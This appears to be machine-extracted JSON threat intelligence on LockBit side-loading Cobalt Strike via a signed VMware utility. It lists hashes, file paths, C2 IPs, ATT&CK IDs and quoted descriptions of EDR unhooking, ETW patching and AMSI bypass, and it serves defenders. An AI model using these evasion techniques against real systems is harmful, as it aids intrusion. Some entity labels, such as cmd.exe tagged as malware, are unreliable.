                        "Once these defenses have been bypassed, the malware proceeds to execute the final payload. The final payload is a Cobalt Strike Beacon Reflective Loader that is stored RC4-encrypted in the previously mentioned c0000015.log file. The RC4 Key Scheduling Algorithm can be seen below with the hardcoded 136 byte key.",
                        "The final result is Beacons Reflective Loader, seen below with the familiar magic bytes and hardcoded strings.",
                        "During a recent investigation, our DFIR team discovered an interesting technique used by LockBit Ransomware Group to load a Cobalt Strike Beacon Reflective Loader. In this particular case, LockBit managed to side-load Cobalt Strike Beacon through a signed VMware xfer logs command line utility."
                    ],
                    "titles": [
                        "Bypassing EDR/EPP Userland Hooks",
                        "Indicators of Compromise",
                        "Executive Summary",
                        "Overview"
                    ]
                },
                "links": [
                    {
                        "src": {
                            "id": "<THREAT_0x2acd2db6>",
                            "type": "Threat",
                            "value": "reflectiveloader"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<THREAT_0xff6ba3c2>",
                            "type": "Threat",
                            "value": "cobalt_strike"
                        }
                    },
                    {
                        "src": {
                            "id": "<THREAT_0x2acd2db6>",
                            "type": "Threat",
                            "value": "reflectiveloader"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<THREAT_0xbfe21cbd>",
                            "type": "Threat",
                            "value": "lockbit"
                        }
                    },
                    {
                        "src": {
                            "id": "<HASHSET_0x4cc018e1>",
                            "type": "HashSet",
                            "value": [
                                {
                                    "id": "<SHA1_0xf683e397>",
                                    "type": "Hash",
                                    "hash_type": "SHA1",
                                    "value": "e35a702db47cb11337f523933acd3bce2f60346d"
                                },
                                {
                                    "id": "<FILE_0x5b59fae8>",
                                    "type": "File",
                                    "value": "c0000015.log"
                                }
                            ]
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0x2acd2db6>",
                            "type": "Threat",
                            "value": "reflectiveloader"
                        }
                    },
                    {
                        "src": {
                            "id": "<THREAT_0xff6ba3c2>",
                            "type": "Threat",
                            "value": "cobalt_strike"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<THREAT_0x2acd2db6>",
                            "type": "Threat",
                            "value": "reflectiveloader"
                        }
                    },
                    {
                        "src": {
                            "id": "<PATH_0xe0fbddbf>",
                            "type": "Path",
                            "value": "c:\\windows\\debug\\c0000015.log"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0x2acd2db6>",
                            "type": "Threat",
                            "value": "reflectiveloader"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<THREAT_0x74437260>",
                    "type": "Threat",
                    "value": "stealbit"
                },
                "references": {
                    "sentences": [
                        "LockBit is a Ransomware as a Service (RaaS) operation that has been active since 2019 (previously known as ABCD). It commonly leverages the double extortion technique, employing tools such as StealBit, WinSCP, and cloud-based backup solutions for data exfiltration prior to deploying the ransomware. Like most ransomware groups, LockBits post-exploitation tool of choice is Cobalt Strike."
                    ],
                    "titles": [
                        "Overview"
                    ]
                },
                "links": [
                    {
                        "src": {
                            "id": "<THREAT_0x74437260>",
                            "type": "Threat",
                            "value": "stealbit"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<THREAT_0xff6ba3c2>",
                            "type": "Threat",
                            "value": "cobalt_strike"
                        }
                    },
                    {
                        "src": {
                            "id": "<THREAT_0x74437260>",
                            "type": "Threat",
                            "value": "stealbit"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<THREAT_0xbfe21cbd>",
                            "type": "Threat",
                            "value": "lockbit"
                        }
                    }
                ]
            }
        ]
    },
    "ttps": {
        "TTP": [
            {
                "token": {
                    "id": "<TTP_0x9cf29456>",
                    "type": "TTP",
                    "value": "t1027"
                },
                "references": {
                    "sentences": [],
                    "titles": [
                        "MITRE ATT&CK TTPs"
                    ]
                },
                "links": [
                    {
                        "src": {
                            "id": "<TTP_0x9cf29456>",
                            "type": "TTP",
                            "value": "t1027"
                        },
                        "relation": "use_ttp",
                        "dst": {
                            "id": "<THREAT_0xff6ba3c2>",
                            "type": "Threat",
                            "value": "cobalt_strike"
                        }
                    },
                    {
                        "src": {
                            "id": "<TTP_0x9cf29456>",
                            "type": "TTP",
                            "value": "t1027"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<THREAT_0xbfe21cbd>",
                            "type": "Threat",
                            "value": "lockbit"
                        }
                    },
                    {
                        "src": {
                            "id": "<TTP_0x9cf29456>",
                            "type": "TTP",
                            "value": "t1027"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<THREAT_0xff6ba3c2>",
                            "type": "Threat",
                            "value": "cobalt_strike"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<TTP_0x66b95cbe>",
                    "type": "TTP",
                    "value": "t1574"
                },
                "references": {
                    "sentences": [],
                    "titles": [
                        "MITRE ATT&CK TTPs"
                    ]
                },
                "links": [
                    {
                        "src": {
                            "id": "<TTP_0x66b95cbe>",
                            "type": "TTP",
                            "value": "t1574"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<THREAT_0xbfe21cbd>",
                            "type": "Threat",
                            "value": "lockbit"
                        }
                    },
                    {
                        "src": {
                            "id": "<TTP_0x66b95cbe>",
                            "type": "TTP",
                            "value": "t1574"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<THREAT_0xff6ba3c2>",
                            "type": "Threat",
                            "value": "cobalt_strike"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<TTP_0xe04c64c1>",
                    "type": "TTP",
                    "value": "t1562.002"
                },
                "references": {
                    "sentences": [],
                    "titles": [
                        "MITRE ATT&CK TTPs"
                    ]
                },
                "links": [
                    {
                        "src": {
                            "id": "<TTP_0xe04c64c1>",
                            "type": "TTP",
                            "value": "t1562.002"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<THREAT_0xbfe21cbd>",
                            "type": "Threat",
                            "value": "lockbit"
                        }
                    },
                    {
                        "src": {
                            "id": "<TTP_0xe04c64c1>",
                            "type": "TTP",
                            "value": "t1562.002"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<THREAT_0xff6ba3c2>",
                            "type": "Threat",
                            "value": "cobalt_strike"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<TTP_0xcf7c5a4>",
                    "type": "TTP",
                    "value": "t1562.001"
                },
                "references": {
                    "sentences": [],
                    "titles": [
                        "MITRE ATT&CK TTPs"
                    ]
                },
                "links": [
                    {
                        "src": {
                            "id": "<TTP_0xcf7c5a4>",
                            "type": "TTP",
                            "value": "t1562.001"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<THREAT_0xff6ba3c2>",
                            "type": "Threat",
                            "value": "cobalt_strike"
                        }
                    },
                    {
                        "src": {
                            "id": "<TTP_0xcf7c5a4>",
                            "type": "TTP",
                            "value": "t1562.001"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<THREAT_0xbfe21cbd>",
                            "type": "Threat",
                            "value": "lockbit"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<TTP_0x96c2bd7a>",
                    "type": "TTP",
                    "value": "t1027.002"
                },
                "references": {
                    "sentences": [],
                    "titles": [
                        "MITRE ATT&CK TTPs"
                    ]
                },
                "links": [
                    {
                        "src": {
                            "id": "<TTP_0x96c2bd7a>",
                            "type": "TTP",
                            "value": "t1027.002"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<THREAT_0xff6ba3c2>",
                            "type": "Threat",
                            "value": "cobalt_strike"
                        }
                    },
                    {
                        "src": {
                            "id": "<TTP_0x96c2bd7a>",
                            "type": "TTP",
                            "value": "t1027.002"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<THREAT_0xbfe21cbd>",
                            "type": "Threat",
                            "value": "lockbit"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<TTP_0x51cf9016>",
                    "type": "TTP",
                    "value": "t1059.001"
                },
                "references": {
                    "sentences": [],
                    "titles": [
                        "MITRE ATT&CK TTPs"
                    ]
                },
                "links": [
                    {
                        "src": {
                            "id": "<TTP_0x51cf9016>",
                            "type": "TTP",
                            "value": "t1059.001"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<THREAT_0xbfe21cbd>",
                            "type": "Threat",
                            "value": "lockbit"
                        }
                    },
                    {
                        "src": {
                            "id": "<TTP_0x51cf9016>",
                            "type": "TTP",
                            "value": "t1059.001"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<THREAT_0xff6ba3c2>",
                            "type": "Threat",
                            "value": "cobalt_strike"
                        }
                    }
                ]
            }
        ]
    },
    "meanings": {
        "Category": [
            {
                "token": {
                    "id": "<CATEGORY_0xa179f90c>",
                    "type": "Category",
                    "value": "ransomware"
                },
                "references": {
                    "sentences": [
                        "LockBit is a Ransomware as a Service (RaaS) operation that has been active since 2019 (previously known as ABCD). It commonly leverages the double extortion technique, employing tools such as StealBit, WinSCP, and cloud-based backup solutions for data exfiltration prior to deploying the ransomware. Like most ransomware groups, LockBits post-exploitation tool of choice is Cobalt Strike.",
                        "LockBit continues to be a successful RaaS and the developers are clearly innovating in response to EDR/EPP solutions. We hope that by describing this latest technique, defenders and security teams will be able to improve their ability to protect their organizations.",
                        "The VMware command line utility VMwareXferlogs.exe used for data transfer to and from VMX logs is susceptible to DLL side-loading.<crlf>During a recent investigation, our DFIR team discovered that LockBit Ransomware-as-a-Service (Raas) side-loads Cobalt Strike Beacon through a signed VMware xfer logs command line utility.<crlf>The threat actor uses PowerShell to download the VMware xfer logs utility along with a malicious DLL, and a .log file containing an encrypted Cobalt Strike Reflective Loader.<crlf>The malicious DLL evades defenses by removing EDR/EPPs userland hooks, and bypasses both Event Tracing for Windows (ETW) and Antimalware Scan Interface (AMSI).",
                        "During a recent investigation, our DFIR team discovered an interesting technique used by LockBit Ransomware Group to load a Cobalt Strike Beacon Reflective Loader. In this particular case, LockBit managed to side-load Cobalt Strike Beacon through a signed VMware xfer logs command line utility."
                    ],
                    "titles": [
                        "Conclusion",
                        "LockBit Ransomware Side-loads Cobalt Strike Beacon with Legitimate VMware Utility",
                        "Executive Summary",
                        "Overview"
                    ]
                },
                "links": [
                    {
                        "src": {
                            "id": "<CATEGORY_0xa179f90c>",
                            "type": "Category",
                            "value": "ransomware"
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<THREAT_0xbfe21cbd>",
                            "type": "Threat",
                            "value": "lockbit"
                        }
                    },
                    {
                        "src": {
                            "id": "<CATEGORY_0xa179f90c>",
                            "type": "Category",
                            "value": "ransomware"
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<THREAT_0xff6ba3c2>",
                            "type": "Threat",
                            "value": "cobalt_strike"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<CATEGORY_0xf1a480bb>",
                    "type": "Category",
                    "value": "malware"
                },
                "references": {
                    "sentences": [
                        "Once control flow is passed to the weaponized DLL, the presence of a debugger is checked by querying the BeingDebugged flag and NtGlobalFlag in the Process Environment Block (PEB). If a debugger is detected, the malware enters an endless loop.",
                        "On the other hand, g_path_get_basename() invokes the malicious payload prior to exiting.",
                        "This routine is repeated for all loaded modules, thus allowing the malware to identify any potential userland hooks installed by EDR/EPP, and overwrite them with the unpatched/unhooked code directly from the modules images on disk.",
                        "Side-loading is a DLL-hijacking technique used to trick a benign process into loading and executing a malicious DLL by placing the DLL alongside the process corresponding EXE, taking advantage of the DLL search order. In this instance, the threat actor used PowerShell to download the VMware xfer logs utility along with a malicious DLL, and a .log file containing an encrypted Cobalt Strike Reflective Loader. The VMware utility was then executed via cmd.exe, passing control flow to the malicious DLL.",
                        "The VMware command line utility VMwareXferlogs.exe used for data transfer to and from VMX logs is susceptible to DLL side-loading.<crlf>During a recent investigation, our DFIR team discovered that LockBit Ransomware-as-a-Service (Raas) side-loads Cobalt Strike Beacon through a signed VMware xfer logs command line utility.<crlf>The threat actor uses PowerShell to download the VMware xfer logs utility along with a malicious DLL, and a .log file containing an encrypted Cobalt Strike Reflective Loader.<crlf>The malicious DLL evades defenses by removing EDR/EPPs userland hooks, and bypasses both Event Tracing for Windows (ETW) and Antimalware Scan Interface (AMSI).",
                        "Once these hooks are removed, the malware continues to evade defenses. Next, an attempt to bypass Event Tracing for Windows (ETW) commences through patching the EtwEventWrite WinAPI with a RET instruction (0xC3), stopping any useful ETW-related telemetry from being generated related to this process.",
                        "When VMwareXferlog.exe calls this function, control flow is transferred to the malicious glib-2.0.dll, rather than the legitimate one, completing the side-loading attack.",
                        "Once these defenses have been bypassed, the malware proceeds to execute the final payload. The final payload is a Cobalt Strike Beacon Reflective Loader that is stored RC4-encrypted in the previously mentioned c0000015.log file. The RC4 Key Scheduling Algorithm can be seen below with the hardcoded 136 byte key.",
                        "A handful of samples related to the malicious DLL were discovered by our investigation. The only notable differences being the RC4 key and name of the file containing the RC4-encrypted payload to decrypt.",
                        "At this juncture, the malware enters a routine to bypass any userland hooks by manually mapping itself into memory, performing a byte-to-byte inspection for any discrepancies between the copy of self and itself, and then overwriting any sections that have discrepancies.",
                        "The attack chain began with several PowerShell commands executed by the threat actor to download three components, a malicious DLL, a signed VMwareXferlogs executable, and an encrypted Cobalt Strike payload in the form of a .log file.",
                        "The VMware command line utility VMwareXferlogs.exe used for data transfer to and from VMX logs is susceptible to DLL side-loading. In our engagement, we saw that the threat actor had created a malicious version of the legitimate glib-2.0.dll to only have code within the g_path_get_basename() function, while all other exports simply called ExitProcess(). This function invokes a malicious payload which, among other things, attempts to bypass EDR/EPP userland hooks and engages in anti-debugging logic.",
                        "This thread is created in a suspended state, allowing the malware to add a user-mode APC, pointing to the payload, to the newly created threads APC queue. Finally, the thread is resumed, allowing the thread to run and execute the Cobalt Strike payload via the APC.",
                        "Exported functions of malicious glib-2.0.dll"
                    ],
                    "titles": [
                        "Conclusion",
                        "Executive Summary",
                        "Indicators of Compromise",
                        "VMware Side-loading Variants",
                        "Bypassing EDR/EPP Userland Hooks",
                        "Attack Chain",
                        "Overview"
                    ]
                },
                "links": [
                    {
                        "src": {
                            "id": "<PATH_0xc61a500b>",
                            "type": "Path",
                            "value": "c:\\windows\\debug\\glib-2.0.dll"
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<CATEGORY_0xf1a480bb>",
                            "type": "Category",
                            "value": "malware"
                        }
                    },
                    {
                        "src": {
                            "id": "<CATEGORY_0xf1a480bb>",
                            "type": "Category",
                            "value": "malware"
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<THREAT_0xbfe21cbd>",
                            "type": "Threat",
                            "value": "lockbit"
                        }
                    },
                    {
                        "src": {
                            "id": "<CATEGORY_0xf1a480bb>",
                            "type": "Category",
                            "value": "malware"
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<THREAT_0xff6ba3c2>",
                            "type": "Threat",
                            "value": "cobalt_strike"
                        }
                    },
                    {
                        "src": {
                            "id": "<HASHSET_0xb92096a4>",
                            "type": "HashSet",
                            "value": [
                                {
                                    "id": "<SHA1_0x3df376a9>",
                                    "type": "Hash",
                                    "hash_type": "SHA1",
                                    "value": "729eb505c36c08860c4408db7be85d707bdcbf1b"
                                },
                                {
                                    "id": "<FILE_0x76a33ffb>",
                                    "type": "File",
                                    "value": "glib-2.0.dll"
                                }
                            ]
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<CATEGORY_0xf1a480bb>",
                            "type": "Category",
                            "value": "malware"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0x9f1c8669>",
                            "type": "File",
                            "value": "vmwarexferlog.exe"
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<CATEGORY_0xf1a480bb>",
                            "type": "Category",
                            "value": "malware"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0x4178cab0>",
                            "type": "File",
                            "value": "cmd.exe"
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<CATEGORY_0xf1a480bb>",
                            "type": "Category",
                            "value": "malware"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<CATEGORY_0xfda51682>",
                    "type": "Category",
                    "value": "scan"
                },
                "references": {
                    "sentences": [
                        "The DLL then proceeded to evade defenses by removing EDR/EPPs userland hooks, as well as bypassing both Event Tracing for Windows (ETW) and Antimalware Scan Interface (AMSI). The .log file was then loaded in memory and decrypted via RC4, revealing a Cobalt Strike Beacon Reflective Loader. Lastly, a user-mode Asynchronous Procedure Call (APC) is queued, which is used to pass control flow to the decrypted Beacon.",
                        "The VMware command line utility VMwareXferlogs.exe used for data transfer to and from VMX logs is susceptible to DLL side-loading.<crlf>During a recent investigation, our DFIR team discovered that LockBit Ransomware-as-a-Service (Raas) side-loads Cobalt Strike Beacon through a signed VMware xfer logs command line utility.<crlf>The threat actor uses PowerShell to download the VMware xfer logs utility along with a malicious DLL, and a .log file containing an encrypted Cobalt Strike Reflective Loader.<crlf>The malicious DLL evades defenses by removing EDR/EPPs userland hooks, and bypasses both Event Tracing for Windows (ETW) and Antimalware Scan Interface (AMSI)."
                    ],
                    "titles": [
                        "Executive Summary",
                        "Overview"
                    ]
                },
                "links": [
                    {
                        "src": {
                            "id": "<CATEGORY_0xfda51682>",
                            "type": "Category",
                            "value": "scan"
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<THREAT_0xff6ba3c2>",
                            "type": "Threat",
                            "value": "cobalt_strike"
                        }
                    },
                    {
                        "src": {
                            "id": "<CATEGORY_0xfda51682>",
                            "type": "Category",
                            "value": "scan"
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<THREAT_0xbfe21cbd>",
                            "type": "Threat",
                            "value": "lockbit"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<CATEGORY_0xb68aa214>",
                    "type": "Category",
                    "value": "rat"
                },
                "references": {
                    "sentences": [
                        "For example, several of the samples attempt to load the file vmtools.ini rather than c0000015.log.",
                        "When VMwareXferlog.exe calls this function, control flow is transferred to the malicious glib-2.0.dll, rather than the legitimate one, completing the side-loading attack."
                    ],
                    "titles": [
                        "Attack Chain",
                        "VMware Side-loading Variants"
                    ]
                },
                "links": [
                    {
                        "src": {
                            "id": "<HASHSET_0x4cc018e1>",
                            "type": "HashSet",
                            "value": [
                                {
                                    "id": "<SHA1_0xf683e397>",
                                    "type": "Hash",
                                    "hash_type": "SHA1",
                                    "value": "e35a702db47cb11337f523933acd3bce2f60346d"
                                },
                                {
                                    "id": "<FILE_0x5b59fae8>",
                                    "type": "File",
                                    "value": "c0000015.log"
                                }
                            ]
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<CATEGORY_0xb68aa214>",
                            "type": "Category",
                            "value": "rat"
                        }
                    },
                    {
                        "src": {
                            "id": "<CATEGORY_0xb68aa214>",
                            "type": "Category",
                            "value": "rat"
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<THREAT_0xbfe21cbd>",
                            "type": "Threat",
                            "value": "lockbit"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0x31b27179>",
                            "type": "File",
                            "value": "vmtools.ini"
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<CATEGORY_0xb68aa214>",
                            "type": "Category",
                            "value": "rat"
                        }
                    },
                    {
                        "src": {
                            "id": "<CATEGORY_0xb68aa214>",
                            "type": "Category",
                            "value": "rat"
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<THREAT_0xff6ba3c2>",
                            "type": "Threat",
                            "value": "cobalt_strike"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0x9f1c8669>",
                            "type": "File",
                            "value": "vmwarexferlog.exe"
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<CATEGORY_0xb68aa214>",
                            "type": "Category",
                            "value": "rat"
                        }
                    },
                    {
                        "src": {
                            "id": "<HASHSET_0xb92096a4>",
                            "type": "HashSet",
                            "value": [
                                {
                                    "id": "<SHA1_0x3df376a9>",
                                    "type": "Hash",
                                    "hash_type": "SHA1",
                                    "value": "729eb505c36c08860c4408db7be85d707bdcbf1b"
                                },
                                {
                                    "id": "<FILE_0x76a33ffb>",
                                    "type": "File",
                                    "value": "glib-2.0.dll"
                                }
                            ]
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<CATEGORY_0xb68aa214>",
                            "type": "Category",
                            "value": "rat"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<CATEGORY_0xc8ecca29>",
                    "type": "Category",
                    "value": "c2"
                },
                "references": {
                    "sentences": [],
                    "titles": [
                        "Indicators of Compromise"
                    ]
                },
                "links": [
                    {
                        "src": {
                            "id": "<IP_0x52ad12eb>",
                            "type": "IP",
                            "value": "149.28.137.7"
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<CATEGORY_0xc8ecca29>",
                            "type": "Category",
                            "value": "c2"
                        }
                    },
                    {
                        "src": {
                            "id": "<IP_0xb0a6436c>",
                            "type": "IP",
                            "value": "45.32.108.54"
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<CATEGORY_0xc8ecca29>",
                            "type": "Category",
                            "value": "c2"
                        }
                    }
                ]
            }
        ]
    },
    "iocs": {
        "File": [
            {
                "token": {
                    "id": "<FILE_0x13a4ae2c>",
                    "type": "File",
                    "value": "vmwarexferlogs.exe"
                },
                "references": {
                    "sentences": [
                        "The downloaded binary (VMwareXferlogs.exe) was then executed via the command prompt, with the STDOUT being redirected to a file.",
                        "The VMware command line utility VMwareXferlogs.exe used for data transfer to and from VMX logs is susceptible to DLL side-loading. In our engagement, we saw that the threat actor had created a malicious version of the legitimate glib-2.0.dll to only have code within the g_path_get_basename() function, while all other exports simply called ExitProcess(). This function invokes a malicious payload which, among other things, attempts to bypass EDR/EPP userland hooks and engages in anti-debugging logic.",
                        "The VMwareXferlogs.exe is a legitimate, signed executable belonging to VMware.",
                        "The VMware command line utility VMwareXferlogs.exe used for data transfer to and from VMX logs is susceptible to DLL side-loading.<crlf>During a recent investigation, our DFIR team discovered that LockBit Ransomware-as-a-Service (Raas) side-loads Cobalt Strike Beacon through a signed VMware xfer logs command line utility.<crlf>The threat actor uses PowerShell to download the VMware xfer logs utility along with a malicious DLL, and a .log file containing an encrypted Cobalt Strike Reflective Loader.<crlf>The malicious DLL evades defenses by removing EDR/EPPs userland hooks, and bypasses both Event Tracing for Windows (ETW) and Antimalware Scan Interface (AMSI)."
                    ],
                    "titles": [
                        "Conclusion",
                        "Attack Chain",
                        "Executive Summary"
                    ]
                },
                "links": [
                    {
                        "src": {
                            "id": "<FILE_0x13a4ae2c>",
                            "type": "File",
                            "value": "vmwarexferlogs.exe"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xff6ba3c2>",
                            "type": "Threat",
                            "value": "cobalt_strike"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0x13a4ae2c>",
                            "type": "File",
                            "value": "vmwarexferlogs.exe"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xbfe21cbd>",
                            "type": "Threat",
                            "value": "lockbit"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0x13a4ae2c>",
                            "type": "File",
                            "value": "vmwarexferlogs.exe"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xad64c800>",
                            "type": "UnknownWord",
                            "value": "susceptible"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0x13a4ae2c>",
                            "type": "File",
                            "value": "vmwarexferlogs.exe"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x7d600d7f>",
                            "type": "UnknownWord",
                            "value": "vmx"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<FILE_0x4178cab0>",
                    "type": "File",
                    "value": "cmd.exe"
                },
                "references": {
                    "sentences": [
                        "Side-loading is a DLL-hijacking technique used to trick a benign process into loading and executing a malicious DLL by placing the DLL alongside the process corresponding EXE, taking advantage of the DLL search order. In this instance, the threat actor used PowerShell to download the VMware xfer logs utility along with a malicious DLL, and a .log file containing an encrypted Cobalt Strike Reflective Loader. The VMware utility was then executed via cmd.exe, passing control flow to the malicious DLL."
                    ],
                    "titles": [
                        "Overview"
                    ]
                },
                "links": [
                    {
                        "src": {
                            "id": "<FILE_0x4178cab0>",
                            "type": "File",
                            "value": "cmd.exe"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xbfe21cbd>",
                            "type": "Threat",
                            "value": "lockbit"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0x4178cab0>",
                            "type": "File",
                            "value": "cmd.exe"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xff6ba3c2>",
                            "type": "Threat",
                            "value": "cobalt_strike"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0x4178cab0>",
                            "type": "File",
                            "value": "cmd.exe"
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<CATEGORY_0xf1a480bb>",
                            "type": "Category",
                            "value": "malware"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<FILE_0x9f1c8669>",
                    "type": "File",
                    "value": "vmwarexferlog.exe"
                },
                "references": {
                    "sentences": [
                        "The weaponized glib-2.0.dll downloaded by the threat actor exports all the necessary functions imported by VMwareXferlog.exe.",
                        "glib-2.0.dll-related functions imported by VMwareXferlog.exe",
                        "glib-2.0.dll functions being called by VMwareXferlog.exe",
                        "When VMwareXferlog.exe calls this function, control flow is transferred to the malicious glib-2.0.dll, rather than the legitimate one, completing the side-loading attack."
                    ],
                    "titles": [
                        "Attack Chain"
                    ]
                },
                "links": [
                    {
                        "src": {
                            "id": "<FILE_0x9f1c8669>",
                            "type": "File",
                            "value": "vmwarexferlog.exe"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xff6ba3c2>",
                            "type": "Threat",
                            "value": "cobalt_strike"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0x9f1c8669>",
                            "type": "File",
                            "value": "vmwarexferlog.exe"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x740f4a89>",
                            "type": "UnknownWord",
                            "value": "completing"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0x9f1c8669>",
                            "type": "File",
                            "value": "vmwarexferlog.exe"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x148d8b4e>",
                            "type": "UnknownWord",
                            "value": "glib-2"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0x9f1c8669>",
                            "type": "File",
                            "value": "vmwarexferlog.exe"
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<CATEGORY_0xf1a480bb>",
                            "type": "Category",
                            "value": "malware"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0x9f1c8669>",
                            "type": "File",
                            "value": "vmwarexferlog.exe"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x92d9e3cc>",
                            "type": "UnknownWord",
                            "value": "dll-related"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0x9f1c8669>",
                            "type": "File",
                            "value": "vmwarexferlog.exe"
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<CATEGORY_0xb68aa214>",
                            "type": "Category",
                            "value": "rat"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0x9f1c8669>",
                            "type": "File",
                            "value": "vmwarexferlog.exe"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xbfe21cbd>",
                            "type": "Threat",
                            "value": "lockbit"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0x9f1c8669>",
                            "type": "File",
                            "value": "vmwarexferlog.exe"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x41cfb030>",
                            "type": "UnknownWord",
                            "value": "imported"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<FILE_0x31b27179>",
                    "type": "File",
                    "value": "vmtools.ini"
                },
                "references": {
                    "sentences": [
                        "The vmtools.ini file being accessed by a variant",
                        "For example, several of the samples attempt to load the file vmtools.ini rather than c0000015.log.",
                        "Another variant shares the same file name to load vmtools.ini, yet is packed with a custom version of UPX."
                    ],
                    "titles": [
                        "Indicators of Compromise",
                        "VMware Side-loading Variants"
                    ]
                },
                "links": [
                    {
                        "src": {
                            "id": "<FILE_0x31b27179>",
                            "type": "File",
                            "value": "vmtools.ini"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xedd6f487>",
                            "type": "UnknownWord",
                            "value": "accessed"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0x31b27179>",
                            "type": "File",
                            "value": "vmtools.ini"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xea1f5834>",
                            "type": "UnknownWord",
                            "value": "packed"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0x31b27179>",
                            "type": "File",
                            "value": "vmtools.ini"
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<CATEGORY_0xb68aa214>",
                            "type": "Category",
                            "value": "rat"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0x31b27179>",
                            "type": "File",
                            "value": "vmtools.ini"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xbfe21cbd>",
                            "type": "Threat",
                            "value": "lockbit"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0x31b27179>",
                            "type": "File",
                            "value": "vmtools.ini"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xff6ba3c2>",
                            "type": "Threat",
                            "value": "cobalt_strike"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0x31b27179>",
                            "type": "File",
                            "value": "vmtools.ini"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x3dbbd6b8>",
                            "type": "UnknownWord",
                            "value": "upx-packed"
                        }
                    }
                ]
